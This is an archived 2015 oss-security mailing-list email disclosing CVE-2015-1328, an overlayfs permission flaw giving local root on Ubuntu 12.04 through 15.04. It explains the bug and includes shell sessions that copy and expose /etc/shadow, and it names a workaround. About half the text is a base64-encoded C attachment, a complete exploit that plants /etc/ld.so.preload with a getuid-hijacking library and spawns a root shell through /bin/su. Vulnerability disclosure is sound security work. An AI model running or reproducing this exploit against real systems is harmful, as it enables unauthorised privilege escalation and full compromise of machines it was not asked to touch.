X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["10978" "Tuesday" "16" "June" "2015" "09:17:28" "+0900" "Philip Pettersson" "philip.pettersson@gmail.com" "<CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>" "212" "[oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root" nil nil nil "6" "2015061600:17:28" "[oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root" (number mark "        philip.pette Jun 16  212/10978 " thread-indent "\"[oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 28532 invoked by uid 550); 16 Jun 2015 01:01:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 13687 invoked from network); 16 Jun 2015 00:17:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=c2w+HNP/bYXuBVUQ5EIQ6ZjMTS7BQG8XWI/xTkGFCSs=;
        b=VDNkrVczNKkKX0ZmYJdaLkUU1X7igx0tHCVnH5UILr7XO6dLitfszwxZY5Syv/UNjW
         BKZv/sNIx2WqAaN+gLytneAmJ22t1VR7L3V+z5Ik2UAQyUP2WEbJ+1cDKZz/omnz3dHz
         tyQe6tvGeLHBQxIAprh1xvjOB3ii16l3ZoWL/hAethRaY6mLtAhWaOsguwMOC/np55IQ
         GGmw9h3w/vU58+mSMDTZ/Tl+bPoVyL0HzaI+FFJYs7g6JS7zFatRiPJmCmz9gYc8H4fv
         ewuI93v6rd67Hf+dHJKNk7lHyChl4Sqh58GbswnQZFrNv3AsVogt9pfng0cRVs6C4ovG
         jfHA==
MIME-Version: 1.0
X-Received: by 10.180.36.103 with SMTP id p7mr103674wij.88.1434413848376; Mon,
 15 Jun 2015 17:17:28 -0700 (PDT)
Message-ID: <CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>
Content-Type: multipart/mixed; boundary=e89a8f502c6ae520020518977ff7
Date: Tue, 16 Jun 2015 09:17:28 +0900
From: Philip Pettersson <philip.pettersson@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root
To: oss-security@lists.openwall.com

--e89a8f502c6ae520020518977ff7
Content-Type: text/plain; charset=UTF-8

Hello, this is CVE-2015-1328 which allows a local root privilege escalation
in the default configuration on all currently supported versions of Ubuntu.

The overlayfs filesystem does not correctly check file permissions when
creating new files in the upper filesystem directory. This can be exploited
by an unprivileged process in kernels with CONFIG_USER_NS=y and where
overlayfs has the FS_USERNS_MOUNT flag, which allows the mounting of overlayfs
inside unprivileged mount namespaces. This is the default configuration of
Ubuntu 12.04, 14.04, 14.10, and 15.04 [1].

If you don't want to update your kernel and you don't use overlayfs, a viable
workaround is to just remove or blacklist overlayfs.ko / overlay.ko.

Details
================================

>From Documentation/filesystems/overlayfs.txt [2]:

"Objects that are not directories (files, symlinks, device-special
files etc.) are presented either from the upper or lower filesystem as
appropriate.  When a file in the lower filesystem is accessed in a way
the requires write-access, such as opening for write access, changing
some metadata etc., the file is first copied from the lower filesystem
to the upper filesystem (copy_up)."

The ovl_copy_up_* functions do not correctly check that the user has
permission to write files to the upperdir directory. The only permissions
that are checked is if the owner of the file that is being modified has
permission to write to the upperdir. Furthermore, when a file is copied from
the lowerdir the file metadata is carbon copied, instead of attributes such as
owner being changed to the user that triggered the copy_up_* procedures.

Example of creating a 1:1 copy of a root-owned file:

(Note that the workdir= option is not needed on older kernels)

user@ubuntu-server-1504:~$ ./create-namespace
root@ubuntu-server-1504:~# mount -t overlay -o
lowerdir=/etc,upperdir=upper,workdir=work overlayfs o
root@ubuntu-server-1504:~# chmod 777 work/work/
root@ubuntu-server-1504:~# cd o
root@ubuntu-server-1504:~/o# mv shadow copy_of_shadow
(exit the namespace)
user@ubuntu-server-1504:~$ ls -al upper/copy_of_shadow
-rw-r----- 1 root shadow 1236 May 24 15:51 upper/copy_of_shadow
user@ubuntu-server-1504:~$ stat upper/copy_of_shadow /etc/shadow|grep Inode
Device: 801h/2049d      Inode: 939791      Links: 1
Device: 801h/2049d      Inode: 277668      Links: 1

Now we can place this file in /etc by switching "upper" to be the lowerdir
option, the permission checks pass since the file is owned by root and root
can write to /etc.

user@ubuntu-server-1504:~$ ./create-namespace
root@ubuntu-server-1504:~# mount -t overlay -o
lowerdir=upper,upperdir=/etc,workdir=work overlayfs o
root@ubuntu-server-1504:~# chmod 777 work/work/
root@ubuntu-server-1504:~# cd o
root@ubuntu-server-1504:~/o# chmod 777 copy_of_shadow
root@ubuntu-server-1504:~/o# exit
user@ubuntu-server-1504:~$ ls -al /etc/copy_of_shadow
-rwxrwxrwx 1 root shadow 1236 May 24 15:51 /etc/copy_of_shadow

The attached exploit gives a root shell by creating a world-writable
/etc/ld.so.preload file. The exploit has been tested on the most recent
kernels before 2015-06-15 on Ubuntu 12.04, 14.04, 14.10 and 15.04.

It is also possible to list directory contents for any directory on the system
regardless of permissions:

nobody@ubuntu-server-1504:~$ ls -al /root
ls: cannot open directory /root: Permission denied
nobody@ubuntu-server-1504:~$ mkdir o upper work
nobody@ubuntu-server-1504:~$ mount -t overlayfs -o
lowerdir=/root,upperdir=/home/user/upper,workdir=/home/user/work
overlayfs /home/user/o
nobody@ubuntu-server-1504:~$ ls -al o 2>/dev/null
total 8
drwxrwxr-x 1 root nogroup 4096 May 24 16:33 .
drwxr-xr-x 8 root nogroup 4096 May 24 16:33 ..
-????????? ? ?    ?          ?            ? .bash_history
-????????? ? ?    ?          ?            ? .bashrc
d????????? ? ?    ?          ?            ? .cache
-????????? ? ?    ?          ?            ? .lesshst
d????????? ? ?    ?          ?            ? linux-3.19.0


Credit
================================
Philip Pettersson, Samsung SDS Security Center

References
================================
[1] https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/vivid/commit/?id=78ec4549
[2] https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt
[3] http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html

--e89a8f502c6ae520020518977ff7
Content-Type: text/x-csrc; charset=US-ASCII; name="ofs.c"
Content-Disposition: attachment; filename="ofs.c"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_iaykwbk10

LyoKKj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9
Kj0qPSo9Kj0qPSo9Kj0qPSo9KgpDVkUtMjAxNS0xMzI4IC8gb2ZzLmMKb3Zl
cmxheWZzIGluY29ycmVjdCBwZXJtaXNzaW9uIGhhbmRsaW5nICsgRlNfVVNF
Uk5TX01PVU5UCgp1c2VyQHVidW50dS1zZXJ2ZXItMTUwNDp+JCB1bmFtZSAt
YQpMaW51eCB1YnVudHUtc2VydmVyLTE1MDQgMy4xOS4wLTE4LWdlbmVyaWMg
IzE4LVVidW50dSBTTVAgVHVlIE1heSAxOSAxODozMTozNSBVVEMgMjAxNSB4
ODZfNjQgeDg2XzY0IHg4Nl82NCBHTlUvTGludXgKdXNlckB1YnVudHUtc2Vy
dmVyLTE1MDQ6fiQgZ2NjIG9mcy5jIC1vIG9mcwp1c2VyQHVidW50dS1zZXJ2
ZXItMTUwNDp+JCBpZAp1aWQ9MTAwMCh1c2VyKSBnaWQ9MTAwMCh1c2VyKSBn
cm91cHM9MTAwMCh1c2VyKSwyNChjZHJvbSksMzAoZGlwKSw0NihwbHVnZGV2
KQp1c2VyQHVidW50dS1zZXJ2ZXItMTUwNDp+JCAuL29mcwpzcGF3bmluZyB0
aHJlYWRzCm1vdW50ICMxCm1vdW50ICMyCmNoaWxkIHRocmVhZHMgZG9uZQov
ZXRjL2xkLnNvLnByZWxvYWQgY3JlYXRlZApjcmVhdGluZyBzaGFyZWQgbGli
cmFyeQojIGlkCnVpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJv
b3QpLDI0KGNkcm9tKSwzMChkaXApLDQ2KHBsdWdkZXYpLDEwMDAodXNlcikK
CmdyZWV0cyB0byBiZWlzdCAmIGthbGltYW4KMjAxNS0wNS0yNAolcmViZWwl
Cio9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9
Kj0qPSo9Kj0qPSo9Kj0qPSoKKi8KCiNpbmNsdWRlIDxzdGRpby5oPgojaW5j
bHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUg
PHNjaGVkLmg+CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8c3lz
L3R5cGVzLmg+CiNpbmNsdWRlIDxzeXMvbW91bnQuaD4KI2luY2x1ZGUgPHN0
ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5o
PgojaW5jbHVkZSA8c2NoZWQuaD4KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+CiNp
bmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9tb3VudC5oPgoj
aW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzaWduYWwuaD4KI2lu
Y2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUg
PGxpbnV4L3NjaGVkLmg+CgojZGVmaW5lIExJQiAiI2luY2x1ZGUgPHVuaXN0
ZC5oPlxuXG51aWRfdCgqX3JlYWxfZ2V0dWlkKSAodm9pZCk7XG5jaGFyIHBh
dGhbMTI4XTtcblxudWlkX3RcbmdldHVpZCh2b2lkKVxue1xuX3JlYWxfZ2V0
dWlkID0gKHVpZF90KCopKHZvaWQpKSBkbHN5bSgodm9pZCAqKSAtMSwgXCJn
ZXR1aWRcIik7XG5yZWFkbGluayhcIi9wcm9jL3NlbGYvZXhlXCIsIChjaGFy
ICopICZwYXRoLCAxMjgpO1xuaWYoZ2V0ZXVpZCgpID09IDAgJiYgIXN0cmNt
cChwYXRoLCBcIi9iaW4vc3VcIikpIHtcbnVubGluayhcIi9ldGMvbGQuc28u
cHJlbG9hZFwiKTt1bmxpbmsoXCIvdG1wL29mcy1saWIuc29cIik7XG5zZXRy
ZXN1aWQoMCwgMCwgMCk7XG5zZXRyZXNnaWQoMCwgMCwgMCk7XG5leGVjbGUo
XCIvYmluL3NoXCIsIFwic2hcIiwgXCItaVwiLCBOVUxMLCBOVUxMKTtcbn1c
biAgICByZXR1cm4gX3JlYWxfZ2V0dWlkKCk7XG59XG4iCgpzdGF0aWMgY2hh
ciBjaGlsZF9zdGFja1sxMDI0KjEwMjRdOwoKc3RhdGljIGludApjaGlsZF9l
eGVjKHZvaWQgKnN0dWZmKQp7CiAgICBjaGFyICpmaWxlOwogICAgc3lzdGVt
KCJybSAtcmYgL3RtcC9uc19zcGxvaXQiKTsKICAgIG1rZGlyKCIvdG1wL25z
X3NwbG9pdCIsIDA3NzcpOwogICAgbWtkaXIoIi90bXAvbnNfc3Bsb2l0L3dv
cmsiLCAwNzc3KTsKICAgIG1rZGlyKCIvdG1wL25zX3NwbG9pdC91cHBlciIs
MDc3Nyk7CiAgICBta2RpcigiL3RtcC9uc19zcGxvaXQvbyIsMDc3Nyk7Cgog
ICAgZnByaW50ZihzdGRlcnIsIm1vdW50ICMxXG4iKTsKICAgIGlmIChtb3Vu
dCgib3ZlcmxheSIsICIvdG1wL25zX3NwbG9pdC9vIiwgIm92ZXJsYXlmcyIs
IE1TX01HQ19WQUwsICJsb3dlcmRpcj0vcHJvYy9zeXMva2VybmVsLHVwcGVy
ZGlyPS90bXAvbnNfc3Bsb2l0L3VwcGVyIikgIT0gMCkgewovLyB3b3JrZGly
PSBhbmQgIm92ZXJsYXkiIGlzIG5lZWRlZCBvbiBuZXdlciBrZXJuZWxzLCBh
bHNvIGNhbid0IHVzZSAvcHJvYyBhcyBsb3dlcgogICAgICAgIGlmIChtb3Vu
dCgib3ZlcmxheSIsICIvdG1wL25zX3NwbG9pdC9vIiwgIm92ZXJsYXkiLCBN
U19NR0NfVkFMLCAibG93ZXJkaXI9L3N5cy9rZXJuZWwvc2VjdXJpdHkvYXBw
YXJtb3IsdXBwZXJkaXI9L3RtcC9uc19zcGxvaXQvdXBwZXIsd29ya2Rpcj0v
dG1wL25zX3NwbG9pdC93b3JrIikgIT0gMCkgewogICAgICAgICAgICBmcHJp
bnRmKHN0ZGVyciwgIm5vIEZTX1VTRVJOU19NT1VOVCBmb3Igb3ZlcmxheWZz
IG9uIHRoaXMga2VybmVsXG4iKTsKICAgICAgICAgICAgZXhpdCgtMSk7CiAg
ICAgICAgfQogICAgICAgIGZpbGUgPSAiLmFjY2VzcyI7CiAgICAgICAgY2ht
b2QoIi90bXAvbnNfc3Bsb2l0L3dvcmsvd29yayIsMDc3Nyk7CiAgICB9IGVs
c2UgZmlsZSA9ICJuc19sYXN0X3BpZCI7CgogICAgY2hkaXIoIi90bXAvbnNf
c3Bsb2l0L28iKTsKICAgIHJlbmFtZShmaWxlLCJsZC5zby5wcmVsb2FkIik7
CgogICAgY2hkaXIoIi8iKTsKICAgIHVtb3VudCgiL3RtcC9uc19zcGxvaXQv
byIpOwogICAgZnByaW50ZihzdGRlcnIsIm1vdW50ICMyXG4iKTsKICAgIGlm
IChtb3VudCgib3ZlcmxheSIsICIvdG1wL25zX3NwbG9pdC9vIiwgIm92ZXJs
YXlmcyIsIE1TX01HQ19WQUwsICJsb3dlcmRpcj0vdG1wL25zX3NwbG9pdC91
cHBlcix1cHBlcmRpcj0vZXRjIikgIT0gMCkgewogICAgICAgIGlmIChtb3Vu
dCgib3ZlcmxheSIsICIvdG1wL25zX3NwbG9pdC9vIiwgIm92ZXJsYXkiLCBN
U19NR0NfVkFMLCAibG93ZXJkaXI9L3RtcC9uc19zcGxvaXQvdXBwZXIsdXBw
ZXJkaXI9L2V0Yyx3b3JrZGlyPS90bXAvbnNfc3Bsb2l0L3dvcmsiKSAhPSAw
KSB7CiAgICAgICAgICAgIGV4aXQoLTEpOwogICAgICAgIH0KICAgICAgICBj
aG1vZCgiL3RtcC9uc19zcGxvaXQvd29yay93b3JrIiwwNzc3KTsKICAgIH0K
CiAgICBjaG1vZCgiL3RtcC9uc19zcGxvaXQvby9sZC5zby5wcmVsb2FkIiww
Nzc3KTsKICAgIHVtb3VudCgiL3RtcC9uc19zcGxvaXQvbyIpOwp9CgppbnQK
bWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpCnsKICAgIGludCBzdGF0dXMs
IGZkLCBsaWI7CiAgICBwaWRfdCB3cmFwcGVyLCBpbml0OwogICAgaW50IGNs
b25lX2ZsYWdzID0gQ0xPTkVfTkVXTlMgfCBTSUdDSExEOwoKICAgIGZwcmlu
dGYoc3RkZXJyLCJzcGF3bmluZyB0aHJlYWRzXG4iKTsKCiAgICBpZigod3Jh
cHBlciA9IGZvcmsoKSkgPT0gMCkgewogICAgICAgIGlmKHVuc2hhcmUoQ0xP
TkVfTkVXVVNFUikgIT0gMCkKICAgICAgICAgICAgZnByaW50ZihzdGRlcnIs
ICJmYWlsZWQgdG8gY3JlYXRlIG5ldyB1c2VyIG5hbWVzcGFjZVxuIik7Cgog
ICAgICAgIGlmKChpbml0ID0gZm9yaygpKSA9PSAwKSB7CiAgICAgICAgICAg
IHBpZF90IHBpZCA9CiAgICAgICAgICAgICAgICBjbG9uZShjaGlsZF9leGVj
LCBjaGlsZF9zdGFjayArICgxMDI0KjEwMjQpLCBjbG9uZV9mbGFncywgTlVM
TCk7CiAgICAgICAgICAgIGlmKHBpZCA8IDApIHsKICAgICAgICAgICAgICAg
IGZwcmludGYoc3RkZXJyLCAiZmFpbGVkIHRvIGNyZWF0ZSBuZXcgbW91bnQg
bmFtZXNwYWNlXG4iKTsKICAgICAgICAgICAgICAgIGV4aXQoLTEpOwogICAg
ICAgICAgICB9CgogICAgICAgICAgICB3YWl0cGlkKHBpZCwgJnN0YXR1cywg
MCk7CgogICAgICAgIH0KCiAgICAgICAgd2FpdHBpZChpbml0LCAmc3RhdHVz
LCAwKTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KCiAgICB1c2xlZXAoMzAw
MDAwKTsKCiAgICB3YWl0KE5VTEwpOwoKICAgIGZwcmludGYoc3RkZXJyLCJj
aGlsZCB0aHJlYWRzIGRvbmVcbiIpOwoKICAgIGZkID0gb3BlbigiL2V0Yy9s
ZC5zby5wcmVsb2FkIixPX1dST05MWSk7CgogICAgaWYoZmQgPT0gLTEpIHsK
ICAgICAgICBmcHJpbnRmKHN0ZGVyciwiZXhwbG9pdCBmYWlsZWRcbiIpOwog
ICAgICAgIGV4aXQoLTEpOwogICAgfQoKICAgIGZwcmludGYoc3RkZXJyLCIv
ZXRjL2xkLnNvLnByZWxvYWQgY3JlYXRlZFxuIik7CiAgICBmcHJpbnRmKHN0
ZGVyciwiY3JlYXRpbmcgc2hhcmVkIGxpYnJhcnlcbiIpOwogICAgbGliID0g
b3BlbigiL3RtcC9vZnMtbGliLmMiLE9fQ1JFQVR8T19XUk9OTFksMDc3Nyk7
CiAgICB3cml0ZShsaWIsTElCLHN0cmxlbihMSUIpKTsKICAgIGNsb3NlKGxp
Yik7CiAgICBsaWIgPSBzeXN0ZW0oImdjYyAtZlBJQyAtc2hhcmVkIC1vIC90
bXAvb2ZzLWxpYi5zbyAvdG1wL29mcy1saWIuYyAtbGRsIC13Iik7CiAgICBp
ZihsaWIgIT0gMCkgewogICAgICAgIGZwcmludGYoc3RkZXJyLCJjb3VsZG4n
dCBjcmVhdGUgZHluYW1pYyBsaWJyYXJ5XG4iKTsKICAgICAgICBleGl0KC0x
KTsKICAgIH0KICAgIHdyaXRlKGZkLCIvdG1wL29mcy1saWIuc29cbiIsMTYp
OwogICAgY2xvc2UoZmQpOwogICAgc3lzdGVtKCJybSAtcmYgL3RtcC9uc19z
cGxvaXQgL3RtcC9vZnMtbGliLmMiKTsKICAgIGV4ZWNsKCIvYmluL3N1Iiwi
c3UiLE5VTEwpOwp9Cgo=

--e89a8f502c6ae520020518977ff7--
